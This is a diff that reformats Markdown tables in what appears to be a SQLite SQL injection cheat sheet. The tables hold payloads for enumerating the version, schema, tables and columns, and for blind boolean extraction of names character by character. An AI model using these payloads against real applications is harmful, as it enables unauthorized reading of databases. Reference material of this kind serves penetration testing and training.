@@ -30,42 +30,42 @@
 
 ## SQLite Enumeration
 
-| Description   | SQL Query |
-| ------------- | ----------------------------------------- |
-| DBMS version  | `select sqlite_version();`                |
+| Description  | SQL Query                  |
+| ------------ | -------------------------- |
+| DBMS version | `select sqlite_version();` |
 
 ## SQLite String
 
 ### SQLite String Methodology
 
-| Description             | SQL Query                                 |
-| ----------------------- | ----------------------------------------- |
-| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
-| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
-| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
-| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
-| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
-| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
-| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
-| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |
+| Description                                          | SQL Query                                                                                              |
+| ---------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
+| Extract Database Structure                           | `SELECT sql FROM sqlite_schema`                                                                        |
+| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master`                                                                        |
+| Extract Table Name                                   | `SELECT tbl_name FROM sqlite_master WHERE type='table'`                                                |
+| Extract Table Name                                   | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
+| Extract Column Name                                  | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'`             |
+| Extract Column Name                                  | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');`                      |
+| Extract Column Name                                  | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'`                                     |
+| Extract Column Name                                  | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')`                                                   |
 
 ## SQLite Blind
 
 ### SQLite Blind Methodology
 
-| Description             | SQL Query                                 |
-| ----------------------- | ----------------------------------------- |
-| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
-| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
-| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
+| Description             | SQL Query                                                                                                                                                                                              |
+| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table`                                                                               |
+| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number`                                                       |
+| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')`                                                    |
 | Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |
 
 ### SQLite Blind With Substring Equivalent
 
-| Function    | Example                                   |
-| ----------- | ----------------------------------------- |
-| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |
-| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |
+| Function    | Example                                  |
+| ----------- | ---------------------------------------- |
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)` |
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`    |
 
 ## SQlite Error Based
 
